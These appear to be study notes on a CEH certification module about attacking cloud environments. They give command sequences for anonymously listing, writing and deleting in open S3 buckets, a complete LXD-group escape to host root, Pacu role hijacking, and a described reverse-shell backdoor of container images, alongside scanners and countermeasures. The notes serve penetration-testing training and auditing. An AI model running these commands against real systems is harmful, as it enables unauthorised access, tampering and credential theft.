# CEHv13 Module 19 — Cloud Computing (technique synthesis)

Source: `CEHv13 - Module 19 - Cloud Computing hide01.ir.pdf` (342 pages, scanned → OCR, full
coverage — all 342 pages rendered and OCR'd, no gaps).

## 1. S3 / storage bucket misconfiguration (AWS)

**Recon — find buckets:**
- Google Dorking on `site:s3.amazonaws.com <target>`, scraping HTML source of target pages for
  bucket URLs, and brute-forcing bucket-name permutations.
- Tools: **S3Scanner**, **lazys3**, **Bucket Finder**, **s3-buckets-bruteforcer**, **CloudBrute**,
  **BucketLoot**.
  ```bash
  s3scanner -bucket <filename>                       # single bucket check
  s3scanner -bucket-file names.txt -enumerate         # bulk check + enumerate objects
  s3scanner -bucket-file names.txt -threads 8

  ./cloudbrute -d <target.com> -k <keyword> -t 80 -T 10 -w /path/to/wordlist.txt   # multi-CSP recon

  python bucketloot.py -l <file_with_bucket_names>    # inspect perms, extract URLs/subdomains/secrets
  python bucketloot.py -c <file_with_bucket_names>
  python bucketloot.py -d <file_with_bucket_names>
  ```

**Exploit once a bucket is found open:**
```bash
aws configure                                         # set up any valid/throwaway creds
aws s3 ls s3://[bucket_name]                           # list signed
aws s3 ls s3://[bucket_name] --no-sign-request         # list unauthenticated (public bucket)
aws s3 mv FileName s3://[bucket_name]/test-file.txt --no-sign-request   # write/tamper
aws s3 cp FileName s3://[bucket_name]/test-file.svg --no-sign-request
aws s3 rm s3://[bucket_name]/test-file.svg --no-sign-request            # delete (verify writable)
```
`--no-sign-request` is the tell: if it works, the bucket policy grants anonymous read/write.

## 2. IAM credential compromise & privilege escalation (AWS)

**How creds leak**: Git repo misconfig (`.env`/`.gitignore` mistakes exposing `aws_access_key_id`),
social engineering, password reuse across services, vulnerabilities in AWS-hosted apps (LFI/SSRF
stealing IAM creds), compromised third-party management tooling, insider abuse.

**Scan for leaked keys locally/in repos:**
```bash
# DumpsterDiver — scans large file sets for hardcoded secrets (AWS keys, etc.)
```

**Hijack misconfigured IAM roles with Pacu** (open-source AWS exploitation framework):
```bash
assume_role_enum.py [-h] [-p PROFILE] [-w WORD_LIST] -i ACCOUNT_ID
```
Targets `AssumeRole` policies where `"Principal": {"AWS": "*"}` lets *any* authenticated AWS
account assume the role. The script brute-forces a 1100+ role-name wordlist against the target
account ID, auto-assumes any vulnerable role found, and dumps the resulting
`AccessKeyId`/`SecretAccessKey`/`SessionToken` in JSON — immediately usable for further access.

**Shadow admin abuse (Azure/AWS)**: look for principals holding permission to self-elevate
without being an admin outright:
- `Microsoft.Authorization/elevateAccess/Action` — elevate own privileges to admin.
- `Microsoft.Authorization/roleDefinitions/write` — modify/create roles to grant admin.
- `Microsoft.Authorization/roleAssignments/write` — assign privileged roles to any principal.
Tool: **SkyArk** (`AWStealth` / `AzureStealth` modules) — scans for entities holding these
sensitive/risky permission sets.

**Kubernetes-specific privesc**: abusing the Certificate Signing Request (CSR) API or an
over-permissive elevation-control mechanism to mint certs/tokens with cluster-admin scope.

## 3. Container / Kubernetes attacks

**Docker/ECR chain via Cloud Container Attack Tool (CCAT)** once AWS creds are compromised:
1. `Enumerate ECR` module — list available ECR repositories reachable with stolen creds.
2. `Pull Repos from ECR` — pull the target org's Docker image.
3. `Docker Backdoor` module — rebuild the image replacing the default `CMD` with a reverse shell.
4. `Push Repos to ECR` — push the backdoored image back, waiting for it to be deployed/run.

**LXD/LXC group privilege escalation** (local priv-esc if a user is in the `lxd` group — grants
root-equivalent, same pattern as Docker group membership):
```bash
mkdir -p $HOME/ContainerImages/alpine/ && cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o path=/mnt/root recursive=true
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list
lxc init alpine privesc -c security.privileged=true
lxc list
lxc config device add privesc hostroot disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh          # now root on host via /mnt/root
```

**Kubernetes volume abuse** (requires some privilege already):
- Access to API/etcd → read volume configs/secrets directly (e.g. iSCSI config stored as secret).
- Access to a node → kubelet exposes every volume used by every pod on that node; `df` reveals
  NFS-mounted volume config for further pivoting.
- Access inside a container → configure a **hostPath** volume type to reach the underlying node
  filesystem and exfiltrate host secrets.

**OWASP Top 10 Kubernetes risks (K1-K10)** worth citing by name in a report: insecure workload
configs, supply-chain vulnerabilities in images, overly permissive RBAC/IAM, lack of centralized
policy enforcement, inadequate logging/monitoring, broken authentication, network
segmentation gaps, secrets-management failures, misconfigured cluster components
(API server/etcd exposure), and **K10: outdated/vulnerable Kubernetes** itself.

**General container escape vectors to probe**: containers running as root (breakout via
privilege escalation to host), exposed `docker.sock` (grants full daemon control = host control),
kernel exploits (shared-kernel model means a host kernel bug compromises every container),
overly permissive network policies, missing logging/monitoring to cover tracks.

## 4. Serverless (FaaS) attacks

OWASP Top 10 serverless risks worth probing:
- Injection (same classes as traditional apps — functions still parse untrusted input).
- Broken authentication (functions assumed "internal-only" but reachable externally).
- Insecure deployment config / excessive IAM permissions on the function's execution role.
- Over-privileged function permissions — functions over time accumulate broader roles than
  needed; check the role attached to every function, not just the app's main role.
- Insecure 3rd-party dependencies bundled into the function package.
- Insufficient logging — serverless is stateless/ephemeral, so without explicit logging an
  attacker's activity in a function invocation leaves nothing behind.
- Broken access control between functions in the same application.
- Sensitive data exposure via `/tmp` (shared across warm invocations) or environment variables.
- Improper exception handling leaking stack traces/internal paths to the caller.
- Legacy/unused functions left deployed — forgotten attack surface.

## 5. Instance Metadata Service (IMDS) attack (AWS/cloud VM credential theft)

Classic SSRF-to-cloud-credential-theft pattern: a vulnerable app server (zero-day, or creds
leaked via a reverse proxy misconfig) is used to reach the instance's local metadata endpoint
and pull the IAM role's temporary credentials, which are then used directly against the cloud
API. Countermeasures: **use IMDSv2** (session-oriented, mitigates basic SSRF-based IMDS theft
that IMDSv1 is vulnerable to), disable IMDS entirely when unused, least-privilege on any role
actually attached, restrict IMDS access for already-suspect principals.

## 6. Other cloud-specific attack patterns

- **Side-channel / cross-guest VM attack**: co-locate a malicious VM on the same physical host as
  the victim's VM (cloud cartography/cache-timing to find co-residency), then abuse shared cache/
  timing side channels to extract crypto keys or plaintext secrets from the neighboring tenant.
- **Wrapping attack**: during SOAP-message translation inside the TLS layer, duplicate/alter the
  message body so the signature still validates but the processed content differs from what was
  signed — lets an attacker inject arbitrary instructions into an otherwise "authenticated" cloud
  API call.
- **Cloud Hopper attack**: compromise a Managed Service Provider (MSP) first, then pivot through
  the MSP's trusted access into every downstream customer tenant — supply-chain-style lateral
  movement at cloud scale. Countermeasure cited: route MSP access through jump servers.

## 7. Recon / misconfiguration-scanning tools

| Tool | Role | Example |
|---|---|---|
| **Prowler** | 240+ CIS/NIST/CISA checks across AWS/Azure/GCP/K8s | `prowler aws --services s3 ec2`, `prowler azure --checks`, `prowler gcp --services iam compute`, `prowler kubernetes --services etcd apiserver`, `prowler <provider> -M csv json-asff json-ocsf html` |
| **CloudSploit** | misconfig scanner (permissive IAM, exposed buckets, unsecured DBs), maps findings to HIPAA/CIS | — |
| **Pacu** | AWS post-exploitation/privesc framework | `assume_role_enum.py` |
| **Cartography** | graphs cloud asset relationships to surface attack paths/privesc chains | — |
| **CloudMapper** | AWS environment visualization, same attack-path use case as Cartography | github.com |
| **SkyArk** | finds shadow-admin / risky-permission principals (AWS + Azure) | github.com |
| **CCAT** | Docker/ECR exploitation post AWS-cred compromise | github.com |
| **DumpsterDiver** | scans files for hardcoded secret keys | — |

## 8. Pitfalls

- `--no-sign-request` success on `aws s3 ls`/`cp`/`rm` is the single fastest signal of a
  critical S3 misconfiguration — check it before anything more involved.
- IMDSv1 vs IMDSv2 matters a lot: an SSRF that works cleanly against IMDSv1 may be fully blocked
  by IMDSv2's session-token requirement — always check which version is in play before assuming
  metadata theft is viable.
- `lxd`/`docker` group membership is effectively root — treat it as a critical finding during
  any Linux host review in a cloud/container environment, not a minor permission note.
- Shadow-admin permissions (`roleDefinitions/write`, `roleAssignments/write`,
  `elevateAccess/Action`) won't show up as "admin" in a naive role listing — explicitly check for
  these three permission strings when auditing IAM, since they grant admin *indirectly*.
- Serverless functions silently accumulate excess IAM permissions over their lifetime — a
  function's current behavior doesn't reflect what its role actually allows; always audit the
  attached policy, not just observed function behavior.
